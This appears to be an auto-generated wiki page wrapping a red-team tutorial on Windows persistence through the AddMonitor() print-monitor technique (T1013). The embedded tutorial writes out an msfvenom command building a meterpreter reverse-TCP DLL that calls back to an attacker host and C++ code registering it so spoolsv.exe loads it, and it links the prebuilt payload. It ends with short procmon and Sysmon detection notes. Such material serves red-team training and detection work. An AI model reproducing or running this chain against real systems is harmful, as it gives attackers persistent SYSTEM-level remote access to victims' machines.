---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# AddMonitor\(\)

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1013-addmonitor` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1013-addmonitor.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [AddMonitor\(\)](../../topics/offensive-security/addmonitor.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-t1013-addmonitor |
| name | AddMonitor\(\) |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/t1013-addmonitor.md |

## Preserved Source Material

````yaml
_asset_filenames:
- monitor-loaddll.png
- monitor-loaddll2.png
- monitor-shell-system.png
- monitor-spoolsvc-rundll.png
- monitor-sysmon.png
- rundll-connect.png
_body: "---\ndescription: 'Persistence, Privilege Escalation'\n---\n\n# AddMonitor\\(\\)\n\n## Execution\n\nGenerating a 64-bit\
  \ meterpreter payload to be injected into the spoolsv.exe:\n\n{% code title=\"attacker@local\" %}\n```csharp\nmsfvenom -p\
  \ windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil64.dll\n```\n{% endcode %}\n\nWriting and compiling\
  \ a simple C++ code that will register the monitor port:\n\n{% code title=\"monitor.cpp\" %}\n```cpp\n#include \"stdafx.h\"\
  \n#include \"Windows.h\"\n\nint main() {\t\n\tMONITOR_INFO_2 monitorInfo;\n\tTCHAR env[12] = TEXT(\"Windows x64\");\n\t\
  TCHAR name[12] = TEXT(\"evilMonitor\");\n\tTCHAR dll[12] = TEXT(\"evil64.dll\");\n\tmonitorInfo.pName = name;\n\tmonitorInfo.pEnvironment\
  \ = env;\n\tmonitorInfo.pDLLName = dll;\n\tAddMonitor(NULL, 2, (LPBYTE)&monitorInfo);\n\treturn 0;\n}\n```\n{% endcode %}\n\
  \n{% file src=\"../../.gitbook/assets/t1013-portmonitor64.exe\" caption=\"PortMonitor64\" %}\n\n{% file src=\"../../.gitbook/assets/evil64.dll\"\
  \ caption=\"evil64.dll - meterpreter payload\" %}\n\nMove evil64.dll to `%systemroot%` and execute the compiled `monitor.cpp`.\n\
  \n## Observations\n\nUpon launching the compiled executable and inspecting the victim machine with procmon, we can see that\
  \ the evil64.dll is being accessed by the spoolsvc:\n\n![](../../.gitbook/assets/monitor-loaddll.png)\n\n![](../../.gitbook/assets/monitor-loaddll2.png)\n\
  \nwhich eventually spawns a rundll32 with meterpreter payload, that initiates a connection back to the attacker:\n\n![](../../.gitbook/assets/rundll-connect.png)\n\
  \n![](../../.gitbook/assets/monitor-shell-system.png)\n\nThe below confirms the procmon results explained above:\n\n![](../../.gitbook/assets/monitor-spoolsvc-rundll.png)\n\
  \nSysmon commandline arguments and network connection logging to the rescue:\n\n![](../../.gitbook/assets/monitor-sysmon.png)\n\
  \n## References\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1013\" %}\n\n{% embed url=\"https://www.youtube.com/watch?v=dq2Hv7J9fvk\"\
  \ %}\n\n{% embed url=\"https://msdn.microsoft.com/en-us/library/windows/desktop/dd183341\\(v=vs.85\\).aspx\" %}\n\n{% embed\
  \ url=\"https://msdn.microsoft.com/en-us/library/windows/desktop/dd145068\\(v=vs.85\\).aspx\" %}"
_relative_path: offensive-security/persistence/t1013-addmonitor.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1013-addmonitor.md
````
